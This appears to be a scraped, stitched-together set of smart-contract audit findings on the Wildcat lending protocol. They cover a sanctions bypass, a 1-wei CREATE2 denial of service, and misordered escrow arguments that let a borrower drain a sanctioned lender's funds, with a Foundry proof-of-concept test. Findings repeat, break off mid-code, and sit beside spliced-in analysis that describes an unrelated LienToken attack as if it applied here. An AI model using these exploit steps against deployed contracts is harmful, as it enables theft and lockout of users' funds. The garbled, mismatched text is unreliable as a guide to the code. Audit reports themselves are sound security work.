tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Impact\n- Lenders can escape the sanctioning of their account in any market.\n\n## Proof of Concept\n- Before diving into the details of how the lenders can escape the sanctioning of their account.\n    - First, let's analyze how a lender can be excised from a Market \n        - When someone calls nukeFromOrbit within that market while flagged as sanctioned by the Chainanalysis oracle\n        - When the lender invokes executeWithdrawal while flagged as sanctioned by the Chainalysis oracle\n    - In either of the two options, the execution flow calls the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) to verify if the account(lender) is sanctioned by the borrower of the market\n        - By analyzing the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43), it can be noted that the lender's account must have been sanctioned in the Oracle first before the account is finally sanction in a Market\n\n> WildcatSanctionsSentinel.sol\n```solidity\n  function isSanctioned(address borrower, address account) public view override returns (bool) {\n    //@audit-info => sanctionOverrides[borrower][account] must be false <==> sanction must not be overridden for this function to return true!\n    //@audit-info => If sanctionOverrides[borrower][account] is set to true, this function will return false, as if the account would not be sanctioned\n\n    //@audit-info => For this function to return true, the account's sanction should have not been overridden (it's set to false), and the account must have been sanctioned in the ChainalysisSanctionsList Oracle.\n    return\n      !sanctionOverrides[borrower][account] &&\n      IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);\n  }\n```\n\n- Now, based on the previous explanation, we know that the lender's account needs to be sanctioned in the Chainalysis Oracle before the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) is called.\n    - This opens up the doors for lenders who realize that their account has been sanctioned in the Chainalysis Oracle to move their MarketTokens to different accounts before the lender's account is fully blocked in the Market (you may be wondering what's the point of transferring tokens to accounts that have not been granted any role in the Market, I'll explain more about this in a sec, bear with me).\n        - So, the lender transfers his MarketTokens to different accounts using the [`WildcatMarketToken::transfer()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L36-L39), as a result, the lender's account that is sanction in the Chainalysis Oracle has no MarketTokens anymore, all those tokens have been moved to another accounts.\n            - Now, at this point, anybody could call the nukeFromOrbit() to fully sanction the lender's account in a specific Market, **either way, the Lender has already moved his tokens to other accounts.**\n\n- So, **at this point, the lender's MarketTokens were distributed among different accounts of his own**, ***such accounts have never interacted with the Market***, so, **their current role is the `Null` Role.**\n- Everything might look fine because the accounts where the tokens were sent have no permissions to interact with the Market, but **there is a bug that allows lenders to gain the WithdrawOnly Role on any account they want without having the consent of the borrower**\n    - This problem is located in the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), the reason of this problem will be explained in the below code walkthrough:\n        - In short, **the Lender will be able to set the WithdrawOnly Role to any account he wishes, the reason is that any account that is not registered in the _authorizedLenders variable of the Controller will forward the value of `_isAuthorized` as false**, and in the [`WildMarketConfig::updateAccountAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L112-L126), **because the value of `_isAuthorized` is false, it will end up granting the WithdrawOnly Role.**\n            - This effectively allows any Lender to grant the WithdrawOnly Role to any account they want to.\n\n> WildcatMarketController.sol\n```solidity\n  //@audit-info => Anybody can call this function and pass a lender and an array of markets where the changes will be applied!\n  function updateLenderAuthorization(address lender, address[] memory markets) external {\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext"

The attack methodology is as follows: 1. The attacker offers a loan denominated in an ERC20 token with transfer restrictions (like USDT and USDC with blocklists). 2. They transfer the `LienToken` to a blocklisted address, sabotaging the repayment attempts, since the payee check in `_getPayee` only checks if an explicit payee is set or defaults to the owner of the `LienToken`. 3. The consequent inability to make repayments forces the loan into liquidation. 4. The attacker then either acts as or colludes with a liquidator to bid in the auction, knowing all bids will fail due to the blocked transfer to the payee. 5. After the failed auction, they can claim the collateral (here being NFTs) without covering the debt, since the faulty liquidation logic allows the collateral to be claimed with zero payment if there are no successful auction bids. This attack exploits an access control or authorization oversight where compromising the recipient's ability to receive payments leads to a strategic default. The `updateLenderAuthorization` function appears to manage the authorization of lenders in various markets but does not directly mitigate the described vulnerability, as it doesn't concern itself with the transferability of ERC20 tokens or the logic allowing for collateral seizure without payment.",

            "detail": "\n# Vulnerability details\n\n## Impact\n- Lenders can escape the sanctioning of their account in any market.\n\n## Proof of Concept\n- Before diving into the details of how the lenders can escape the sanctioning of their account.\n    - First, let's analyze how a lender can be excised from a Market \n        - When someone calls nukeFromOrbit within that market while flagged as sanctioned by the Chainanalysis oracle\n        - When the lender invokes executeWithdrawal while flagged as sanctioned by the Chainalysis oracle\n    - In either of the two options, the execution flow calls the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) to verify if the account(lender) is sanctioned by the borrower of the market\n        - By analyzing the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43), it can be noted that the lender's account must have been sanctioned in the Oracle first before the account is finally sanction in a Market\n\n> WildcatSanctionsSentinel.sol\n```solidity\n  function isSanctioned(address borrower, address account) public view override returns (bool) {\n    //@audit-info => sanctionOverrides[borrower][account] must be false <==> sanction must not be overridden for this function to return true!\n    //@audit-info => If sanctionOverrides[borrower][account] is set to true, this function will return false, as if the account would not be sanctioned\n\n    //@audit-info => For this function to return true, the account's sanction should have not been overridden (it's set to false), and the account must have been sanctioned in the ChainalysisSanctionsList Oracle.\n    return\n      !sanctionOverrides[borrower][account] &&\n      IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);\n  }\n```\n\n- Now, based on the previous explanation, we know that the lender's account needs to be sanctioned in the Chainalysis Oracle before the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) is called.\n    - This opens up the doors for lenders who realize that their account has been sanctioned in the Chainalysis Oracle to move their MarketTokens to different accounts before the lender's account is fully blocked in the Market (you may be wondering what's the point of transferring tokens to accounts that have not been granted any role in the Market, I'll explain more about this in a sec, bear with me).\n        - So, the lender transfers his MarketTokens to different accounts using the [`WildcatMarketToken::transfer()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L36-L39), as a result, the lender's account that is sanction in the Chainalysis Oracle has no MarketTokens anymore, all those tokens have been moved to another accounts.\n            - Now, at this point, anybody could call the nukeFromOrbit() to fully sanction the lender's account in a specific Market, **either way, the Lender has already moved his tokens to other accounts.**\n\n- So, **at this point, the lender's MarketTokens were distributed among different accounts of his own**, ***such accounts have never interacted with the Market***, so, **their current role is the `Null` Role.**\n- Everything might look fine because the accounts where the tokens were sent have no permissions to interact with the Market, but **there is a bug that allows lenders to gain the WithdrawOnly Role on any account they want without having the consent of the borrower**\n    - This problem is located in the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), the reason of this problem will be explained in the below code walkthrough:\n        - In short, **the Lender will be able to set the WithdrawOnly Role to any account he wishes, the reason is that any account that is not registered in the _authorizedLenders variable of the Controller will forward the value of `_isAuthorized` as false**, and in the [`WildMarketConfig::updateAccountAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L112-L126), **because the value of `_isAuthorized` is false, it will end up granting the WithdrawOnly Role.**\n            - This effectively allows any Lender to grant the WithdrawOnly Role to any account they want to.\n\n> WildcatMarketController.sol\n```solidity\n  //@audit-info => Anybody can call this function and pass a lender and an array of markets where the changes will be applied!\n  function updateLenderAuthorization(address lender, address[] memory markets) external {\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext"

If the `onlyController` modifier is not correctly checking for sufficient permissions (i.e., that the caller is indeed the controller or has been granted specific authority), then the function may be vulnerable to unauthorized access.\n\nAccess control vulnerabilities can lead to unauthorized actors manipulating account permissions, resulting in potential asset theft or other malicious outcomes. For a proper access control mechanism, the function would need to not only restrict who can call it (which is presumably the role of the `onlyController` modifier) but also ensure that any delegation of rights is properly managed and verified before such a sensitive update is applied.\n\nDue to the absence of the actual code implementation of the `onlyController` modifier, I recommend that this modifier's definition be obtained and reviewed to confirm that it implements appropriate access control checks.

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation 